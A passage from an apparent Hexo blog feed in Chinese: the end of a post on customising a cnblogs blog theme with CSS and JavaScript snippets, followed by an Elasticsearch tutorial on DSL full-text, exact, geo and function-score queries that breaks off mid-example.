build</code></pre><p>&emsp;&emsp;如果没有安装node。js或者不会使用的童鞋可以在我的GitHub，也就是博客皮肤源码地址中。</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>&emsp;&emsp;重点部署之前使用博客园的cutorm皮肤，具体部署细节请详见’如何部署、使用皮肤’，如果又不会的话可以看一看我的配置作为参考（仅作为参考，找不回来别哭鼻子）<br><em><strong>CSS</strong></em></p><pre><code>&lt;!-- 溢出隐藏设置（放置在管理--&gt; 设置--&gt; css模块中） --&gt;#topics, #mainContent &#123;    overflow: visible;&#125;.cnblogs-markdown .hljs&#123;    display:block;    color:#333;    overflow-x:auto;    background:#F2F4F5!important;    border:none!important;    font-family:Consolas,Monaco,&#39;Andale Mono&#39;,&#39;Ubuntu Mono&#39;,monospace!important;    padding:1em!important;    font-size:14px!important    &#125;</code></pre><p><em><strong>侧边栏公告</strong></em></p><pre><code>&lt;!-- 在管理--&gt; 设置-&gt; 侧边栏公告(支持js代码、支持html代码) --&gt;&lt;script src=&quot;https://blog-static.cnblogs.com/files/glassysky/silence.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    $.silence(&#123;        profile: &#123;            enable: true,            avatar: &#39;https://gitee.com/glassyskyforgame/glassysky/blob/master/4c67d1a20cf431ade2873e284836acaf2fdd989e.jpg&#39;,            favicon: &#39;https://gitee.com/glassyskyforgame/glassysky/raw/master/4c67d1a20cf431ade2873e284836acaf2fdd989e.jpg&#39;,        &#125;,        catalog: &#123;            enable: true,            move: true,            index: true,            level1: &#39;h2&#39;,            level2: &#39;h3&#39;,            level3: &#39;h4&#39;,        &#125;,        signature: &#123;            enable: true,            home: &#39;https://www.cnblogs.com/glassysky/&#39;,            license: &#39;署名 4.0 国际&#39;,            link: &#39;https://creativecommons.org/licenses/by/4.0&#39;        &#125;,        reward: &#123;            enable: true,            title: &#39;感谢小可爱投食&#39;,            wechat: &#39;https://images.cnblogs.com/cnblogs_com/esofar/972540/o_wechat.png&#39;,            alipay: &#39;https://images.cnblogs.com/cnblogs_com/esofar/972540/o_alipay.png&#39;        &#125;,        github: &#123;            enable: true,            color: &#39;#fff&#39;,            fill: null,            link: &#39;https://github.com/glassy-sky-lisong&#39;        &#125;    &#125;);&lt;/script&gt;&lt;!--外置主题css补丁--&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://blog-static.cnblogs.com/files/glassysky/sli.css&quot;/&gt;</code></pre><p><em><strong>会动的title</strong></em></p><pre><code>&lt;!-- 动态titlejs --&gt;&lt;script&gt; var OriginTitle = document.title; var titleTime; document.addEventListener(&#39;visibilitychange&#39;, function () &#123; if                 (document.hidden) &#123; document.title = &#39;╭(°A°`)╮ 页面崩溃啦 ~&#39;; clearTimeout(titleTime); &#125; else &#123; document.title = &#39;(ฅ&gt;ω&lt;*ฅ) 噫又    好了~&#39; + OriginTitle; titleTime = setTimeout(function () &#123; document.title = OriginTitle; &#125;, 2000); &#125; &#125;); &lt;/script&gt;</code></pre><p><em><strong>图片放大功能</strong></em></p><pre><code>&lt;!--图片放大的zoomcss和js--&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://blog-static.cnblogs.com/files/glassysky/zoom.css&quot;/&gt;&lt;script src=&quot;https://blog-static.cnblogs.com/files/glassysky/zoom.js&quot;&gt;&lt;/script&gt;&lt;!-- Bootstrap 的 transition.js cdn（过渡动画插件）--&gt;&lt;script type=&quot;text/javascript&quot;&gt;$(&#39;#cnblogs_post_body img&#39;).attr(&#39;data-action&#39;, &#39;zoom&#39;);&lt;/script&gt;</code></pre><h2 id="博客的皮肤风格"><a href="#博客的皮肤风格" class="headerlink" title="博客的皮肤风格"></a>博客的皮肤风格</h2><ul><li>简约·蓝<br><img src="https://github.com/esofar/cnblogs-theme-silence/raw/master/docs/theme_default.png" alt="img1"> </li><li>暗黑·绿<br><img src="https://github.com/esofar/cnblogs-theme-silence/raw/master/docs/theme_dark.png" alt="img2"></li><li>女神·粉<br><img src="https://github.com/esofar/cnblogs-theme-silence/raw/master/docs/theme_goddess.png" alt="img3">  </li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客园博文 </category>
          
          <category> 博客美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客园 </tag>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch高级</title>
      <link href="/bufferfly/blog/2376083540.html"/>
      <url>/bufferfly/blog/2376083540.html</url>
      
        <content type="html"><![CDATA[<p>我们已经导入了大量数据到elasticsearch中，实现了elasticsearch的数据存储功能。但elasticsearch最擅长的还是搜索和数据分析。<br />所以今天，我们研究下elasticsearch的数据搜索功能。我们会分别使用<strong>DSL</strong>和<strong>RestClient</strong>实现搜索。<br><a name="IO9W4"></a></p><h1 id="0-学习目标"><a href="#0-学习目标" class="headerlink" title="0.学习目标"></a>0.学习目标</h1><p><a name="xZaJf"></a></p><h1 id="1-DSL查询文档"><a href="#1-DSL查询文档" class="headerlink" title="1.DSL查询文档"></a>1.DSL查询文档</h1><p>elasticsearch的查询依然是基于JSON风格的DSL来实现的。<br><a name="wR3NH"></a></p><h2 id="1-1-DSL查询分类"><a href="#1-1-DSL查询分类" class="headerlink" title="1.1.DSL查询分类"></a>1.1.DSL查询分类</h2><p>Elasticsearch提供了基于JSON的DSL（<a href="https://_www.elastic.co_guide_en_elasticsearch_reference_current_query-dsl/">Domain Specific Language</a>）来定义查询。常见的查询类型包括：</p><ul><li><strong>查询所有</strong>：查询出所有数据，一般测试用。例如：match_all</li><li><strong>全文检索（full text）查询</strong>：利用分词器对用户输入内容分词，然后去倒排索引库中匹配。例如：<ul><li>match_query</li><li>multi_match_query</li></ul></li><li><strong>精确查询</strong>：根据精确词条值查找数据，一般是查找keyword、数值、日期、boolean等类型字段。例如：<ul><li>ids</li><li>range</li><li>term</li></ul></li><li><strong>地理（geo）查询</strong>：根据经纬度查询。例如：<ul><li>geo_distance</li><li>geo_bounding_box</li></ul></li><li><strong>复合（compound）查询</strong>：复合查询可以将上述各种查询条件组合起来，合并查询条件。例如：<ul><li>bool</li><li>function_score</li></ul></li></ul><p>查询的语法基本一致：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;查询类型&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;查询条件&quot;</span>: <span class="string">&quot;条件值&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们以查询所有为例，其中：</p><ul><li><p>查询类型为match_all</p></li><li><p>没有查询条件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询所有</span></span><br><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match_all&quot;</span>: &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其它查询无非就是<strong>查询类型</strong>、<strong>查询条件</strong>的变化。<br><a name="sP5bU"></a></p><h2 id="1-2-全文检索查询"><a href="#1-2-全文检索查询" class="headerlink" title="1.2.全文检索查询"></a>1.2.全文检索查询</h2><p><a name="Q3afF"></a></p><h3 id="1-2-1-使用场景"><a href="#1-2-1-使用场景" class="headerlink" title="1.2.1.使用场景"></a>1.2.1.使用场景</h3><p>全文检索查询的基本流程如下：</p></li><li><p>对用户搜索的内容做分词，得到词条</p></li><li><p>根据词条去倒排索引库中匹配，得到文档id</p></li><li><p>根据文档id找到文档，返回给用户</p></li></ul><p>比较常用的场景包括：</p><ul><li>商城的输入框搜索</li><li>百度输入框搜索</li></ul><p>例如京东：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490101-124b9131-b8c7-4a21-9990-7242f0175454.png#averageHue=%23f6efee&crop=0&crop=0&crop=1&crop=1&id=WGb76&originHeight=186&originWidth=1024&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />因为是拿着词条去匹配，因此参与搜索的字段也必须是可分词的text类型的字段。<br><a name="QXFkb"></a></p><h3 id="1-2-2-基本语法"><a href="#1-2-2-基本语法" class="headerlink" title="1.2.2.基本语法"></a>1.2.2.基本语法</h3><p>常见的全文检索查询包括：</p><ul><li>match查询：单字段查询</li><li>multi_match查询：多字段查询，任意一个字段符合条件就算符合查询条件</li></ul><p>match查询语法如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: <span class="string">&quot;TEXT&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mulit_match语法如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;multi_match&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;query&quot;</span>: <span class="string">&quot;TEXT&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;fields&quot;</span>: [<span class="string">&quot;FIELD1&quot;</span>, <span class="string">&quot; FIELD12&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="e0oma"></a></p><h3 id="1-2-3-示例"><a href="#1-2-3-示例" class="headerlink" title="1.2.3.示例"></a>1.2.3.示例</h3><p>match查询示例：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490209-54b063cd-9946-4b84-891b-f76e4d5f0a59.png#averageHue=%23d8e8e7&crop=0&crop=0&crop=1&crop=1&id=uKm2T&originHeight=588&originWidth=1758&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />multi_match查询示例：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490384-9c56b5a9-9e87-44e3-9cd7-f914077479a7.png#averageHue=%23f3f7fa&crop=0&crop=0&crop=1&crop=1&id=KXO9Z&originHeight=586&originWidth=1761&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />可以看到，两种查询结果是一样的，为什么？<br />因为我们将brand、name、business值都利用copy_to复制到了all字段中。因此你根据三个字段搜索，和根据all字段搜索效果当然一样了。<br />但是，搜索字段越多，对查询性能影响越大，因此建议采用copy_to，然后单字段查询的方式。<br><a name="qn18A"></a></p><h3 id="1-2-4-总结"><a href="#1-2-4-总结" class="headerlink" title="1.2.4.总结"></a>1.2.4.总结</h3><p>match和multi_match的区别是什么？</p><ul><li><p>match：根据一个字段查询</p></li><li><p>multi_match：根据多个字段查询，参与查询字段越多，查询性能越差<br><a name="MGeCg"></a></p><h2 id="1-3-精准查询"><a href="#1-3-精准查询" class="headerlink" title="1.3.精准查询"></a>1.3.精准查询</h2><p>精确查询一般是查找keyword、数值、日期、boolean等类型字段。所以<strong>不会</strong>对搜索条件分词。常见的有：</p></li><li><p>term：根据词条精确值查询</p></li><li><p>range：根据值的范围查询<br><a name="pKtFT"></a></p><h3 id="1-3-1-term查询"><a href="#1-3-1-term查询" class="headerlink" title="1.3.1.term查询"></a>1.3.1.term查询</h3><p>因为精确查询的字段搜是不分词的字段，因此查询的条件也必须是<strong>不分词</strong>的词条。查询时，用户输入的内容跟自动值完全匹配时才认为符合条件。如果用户输入的内容过多，反而搜索不到数据。<br />语法说明：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// term查询</span></span><br><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;term&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;VALUE&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：<br />当我搜索的是精确词条时，能正确查询出结果：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490580-c26c1550-7727-4d83-9e25-8d46070627d7.png#averageHue=%23f3f7fa&crop=0&crop=0&crop=1&crop=1&id=OzfCr&originHeight=557&originWidth=1557&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />但是，当我搜索的内容不是词条，而是多个词语形成的短语时，反而搜索不到：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490726-dda8a24e-be56-45de-817b-35252d3f8898.png#averageHue=%23f2f5f9&crop=0&crop=0&crop=1&crop=1&id=qYqlA&originHeight=463&originWidth=1307&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="QWMFR"></a></p><h3 id="1-3-2-range查询"><a href="#1-3-2-range查询" class="headerlink" title="1.3.2.range查询"></a>1.3.2.range查询</h3><p>范围查询，一般应用在对数值类型做范围过滤的时候。比如做价格范围过滤。<br />基本语法：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// range查询</span></span><br><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;range&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;gte&quot;</span>: <span class="number">10</span>, <span class="comment">// 这里的gte代表大于等于，gt则代表大于</span></span><br><span class="line">        <span class="attr">&quot;lte&quot;</span>: <span class="number">20</span> <span class="comment">// lte代表小于等于，lt则代表小于</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490838-418aa4de-63d5-452e-8767-d74c1f414e87.png#averageHue=%23f0f5f8&crop=0&crop=0&crop=1&crop=1&id=UxMVD&originHeight=414&originWidth=1482&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="Yhnin"></a></p><h3 id="1-3-3-总结"><a href="#1-3-3-总结" class="headerlink" title="1.3.3.总结"></a>1.3.3.总结</h3><p>精确查询常见的有哪些？</p></li><li><p>term查询：根据词条精确匹配，一般搜索keyword类型、数值类型、布尔类型、日期类型字段</p></li><li><p>range查询：根据数值范围查询，可以是数值、日期的范围<br><a name="bTbvn"></a></p><h2 id="1-4-地理坐标查询"><a href="#1-4-地理坐标查询" class="headerlink" title="1.4.地理坐标查询"></a>1.4.地理坐标查询</h2><p>所谓的地理坐标查询，其实就是根据经纬度查询，官方文档：<a href="https://_www.elastic.co_guide_en_elasticsearch_reference_current_geo-queries/">https://www.elastic.co/guide/en/elasticsearch/reference/current/geo-queries.html</a><br />常见的使用场景包括：</p></li><li><p>携程：搜索我附近的酒店</p></li><li><p>滴滴：搜索我附近的出租车</p></li><li><p>微信：搜索我附近的人</p></li></ul><p>附近的酒店：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490964-d895b121-bf0b-4f8e-8f1a-6396ab746832.png#averageHue=%23f2ece1&crop=0&crop=0&crop=1&crop=1&id=KoZgm&originHeight=398&originWidth=373&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />附近的车：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218491071-5fac23a9-4cd8-43e7-a4d1-0783fd4370c4.png#averageHue=%2358b8a3&crop=0&crop=0&crop=1&crop=1&id=Mbbzj&originHeight=502&originWidth=295&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="S0XhR"></a></p><h3 id="1-4-1-矩形范围查询"><a href="#1-4-1-矩形范围查询" class="headerlink" title="1.4.1.矩形范围查询"></a>1.4.1.矩形范围查询</h3><p>矩形范围查询，也就是geo_bounding_box查询，查询坐标落在某个矩形范围的所有文档：<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/21797045/1670218491205-88950fd2-d714-49b9-9056-464de70528cd.gif#averageHue=%23bed2b7&crop=0&crop=0&crop=1&crop=1&id=MiNrT&originHeight=170&originWidth=336&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />查询时，需要指定矩形的<strong>左上</strong>、<strong>右下</strong>两个点的坐标，然后画出一个矩形，落在该矩形内的都是符合条件的点。<br />语法如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// geo_bounding_box查询</span></span><br><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;geo_bounding_box&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;top_left&quot;</span>: &#123; <span class="comment">// 左上点</span></span><br><span class="line">          <span class="attr">&quot;lat&quot;</span>: <span class="number">31.1</span>,</span><br><span class="line">          <span class="attr">&quot;lon&quot;</span>: <span class="number">121.5</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;bottom_right&quot;</span>: &#123; <span class="comment">// 右下点</span></span><br><span class="line">          <span class="attr">&quot;lat&quot;</span>: <span class="number">30.9</span>,</span><br><span class="line">          <span class="attr">&quot;lon&quot;</span>: <span class="number">121.7</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种并不符合“附近的人”这样的需求，所以我们就不做了。<br><a name="L633j"></a></p><h3 id="1-4-2-附近查询"><a href="#1-4-2-附近查询" class="headerlink" title="1.4.2.附近查询"></a>1.4.2.附近查询</h3><p>附近查询，也叫做距离查询（geo_distance）：查询到指定中心点小于某个距离值的所有文档。<br />换句话来说，在地图上找一个点作为圆心，以指定距离为半径，画一个圆，落在圆内的坐标都算符合条件：<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/21797045/1670218491356-c33f6739-59e6-4972-9fff-c539d50a11fb.gif#averageHue=%23c2e3ca&crop=0&crop=0&crop=1&crop=1&id=WhBQf&originHeight=323&originWidth=546&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />语法说明：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// geo_distance 查询</span></span><br><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;geo_distance&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;distance&quot;</span>: <span class="string">&quot;15km&quot;</span>, <span class="comment">// 半径</span></span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: <span class="string">&quot;31.21,121.5&quot;</span> <span class="comment">// 圆心</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：<br />我们先搜索陆家嘴附近15km的酒店：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218491517-6e16f6f0-e21e-47fd-8f6c-bf52913f5703.png#averageHue=%23f2f6f9&crop=0&crop=0&crop=1&crop=1&id=WGm5m&originHeight=474&originWidth=1283&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />发现共有47家酒店。<br />然后把半径缩短到3公里：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218491648-07b84b6e-ca6a-495d-a050-546acdd6727b.png#averageHue=%23d9e9ea&crop=0&crop=0&crop=1&crop=1&id=aHt4l&originHeight=470&originWidth=1308&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />可以发现，搜索到的酒店数量减少到了5家。<br><a name="wDQsr"></a></p><h2 id="1-5-复合查询"><a href="#1-5-复合查询" class="headerlink" title="1.5.复合查询"></a>1.5.复合查询</h2><p>复合（compound）查询：复合查询可以将其它简单查询组合起来，实现更复杂的搜索逻辑。常见的有两种：</p><ul><li><p>fuction score：算分函数查询，可以控制文档相关性算分，控制文档排名</p></li><li><p>bool query：布尔查询，利用逻辑关系组合多个其它的查询，实现复杂搜索<br><a name="iqCru"></a></p><h3 id="1-5-1-相关性算分"><a href="#1-5-1-相关性算分" class="headerlink" title="1.5.1.相关性算分"></a>1.5.1.相关性算分</h3><p>当我们利用match查询时，文档结果会根据与搜索词条的关联度打分（_score），返回结果时按照分值降序排列。<br />例如，我们搜索 “虹桥如家”，结果如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;_score&quot;</span> : <span class="number">17.850193</span>,</span><br><span class="line">    <span class="attr">&quot;_source&quot;</span> : &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;虹桥如家酒店真不错&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;_score&quot;</span> : <span class="number">12.259849</span>,</span><br><span class="line">    <span class="attr">&quot;_source&quot;</span> : &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;外滩如家酒店真不错&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;_score&quot;</span> : <span class="number">11.91091</span>,</span><br><span class="line">    <span class="attr">&quot;_source&quot;</span> : &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;迪士尼如家酒店真不错&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在elasticsearch中，早期使用的打分算法是TF-IDF算法，公式如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218491765-3cee45ba-785c-4889-98c3-a61dc10197eb.png#averageHue=%23a6a6a6&crop=0&crop=0&crop=1&crop=1&id=g9Pl5&originHeight=376&originWidth=851&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />在后来的5.1版本升级中，elasticsearch将算法改进为BM25算法，公式如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218491848-2d5a1b84-f1ef-4710-9587-c512c08ca4ba.png#averageHue=%23979797&crop=0&crop=0&crop=1&crop=1&id=R2iwH&originHeight=195&originWidth=912&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />TF-IDF算法有一各缺陷，就是词条频率越高，文档得分也会越高，单个词条对文档影响较大。而BM25则会让单个词条的算分有一个上限，曲线更加平滑：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218491939-f41ebd42-83f3-486d-b9c2-1b298981979e.png#averageHue=%23f6f6f6&crop=0&crop=0&crop=1&crop=1&id=FbqnK&originHeight=416&originWidth=589&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />小结：elasticsearch会根据词条和文档的相关度做打分，算法由两种：</p></li><li><p>TF-IDF算法</p></li><li><p>BM25算法，elasticsearch5.1版本后采用的算法<br><a name="Zvzuv"></a></p><h3 id="1-5-2-算分函数查询"><a href="#1-5-2-算分函数查询" class="headerlink" title="1.5.2.算分函数查询"></a>1.5.2.算分函数查询</h3><p>根据相关度打分是比较合理的需求，但<strong>合理的不一定是产品经理需要</strong>的。<br />以百度为例，你搜索的结果中，并不是相关度越高排名越靠前，而是谁掏的钱多排名就越靠前。如图：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492057-425fabba-6a06-4bca-82d9-a01ffd71b18e.png#averageHue=%23f9e7e5&crop=0&crop=0&crop=1&crop=1&id=FJOd9&originHeight=332&originWidth=741&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />要想认为控制相关性算分，就需要利用elasticsearch中的function score 查询了。<br><a name="a207P"></a></p><h4 id="1）语法说明"><a href="#1）语法说明" class="headerlink" title="1）语法说明"></a>1）语法说明</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492148-edc999a4-3d92-4f9b-a9ff-19da37f00cd0.png#averageHue=%23f5f7f0&crop=0&crop=0&crop=1&crop=1&id=o9OVq&originHeight=556&originWidth=1409&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />function score 查询中包含四部分内容：</p></li><li><p><strong>原始查询</strong>条件：query部分，基于这个条件搜索文档，并且基于BM25算法给文档打分，<strong>原始算分</strong>（query score)</p></li><li><p><strong>过滤条件</strong>：filter部分，符合该条件的文档才会重新算分</p></li><li><p><strong>算分函数</strong>：符合filter条件的文档要根据这个函数做运算，得到的<strong>函数算分</strong>（function score），有四种函数</p><ul><li>weight：函数结果是常量</li><li>field_value_factor：以文档中的某个字段值作为函数结果</li><li>random_score：以随机数作为函数结果</li><li>script_score：自定义算分函数算法</li></ul></li><li><p><strong>运算模式</strong>：算分函数的结果、原始查询的相关性算分，两者之间的运算方式，包括：</p><ul><li>multiply：相乘</li><li>replace：用function score替换query score</li><li>其它，例如：sum、avg、max、min</li></ul></li></ul><p>function score的运行流程如下：</p><ul><li>1）根据<strong>原始条件</strong>查询搜索文档，并且计算相关性算分，称为<strong>原始算分</strong>（query score）</li><li>2）根据<strong>过滤条件</strong>，过滤文档</li><li>3）符合<strong>过滤条件</strong>的文档，基于<strong>算分函数</strong>运算，得到<strong>函数算分</strong>（function score）</li><li>4）将<strong>原始算分</strong>（query score）和<strong>函数算分</strong>（function score）基于<strong>运算模式</strong>做运算，得到最终结果，作为相关性算分。</li></ul><p>因此，其中的关键点是：</p><ul><li><p>过滤条件：决定哪些文档的算分被修改</p></li><li><p>算分函数：决定函数算分的算法</p></li><li><p>运算模式：决定最终算分结果<br><a name="kWA3W"></a></p><h4 id="2）示例"><a href="#2）示例" class="headerlink" title="2）示例"></a>2）示例</h4><p>需求：给“如家”这个品牌的酒店排名靠前一些<br />翻译一下这个需求，转换为之前说的四个要点：</p></li><li><p>原始条件：不确定，可以任意变化</p></li><li><p>过滤条件：brand = “如家”</p></li><li><p>算分函数：可以简单粗暴，直接给固定的算分结果，weight</p></li><li><p>运算模式：比如求和</p></li></ul><p>因此最终的DSL语句如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 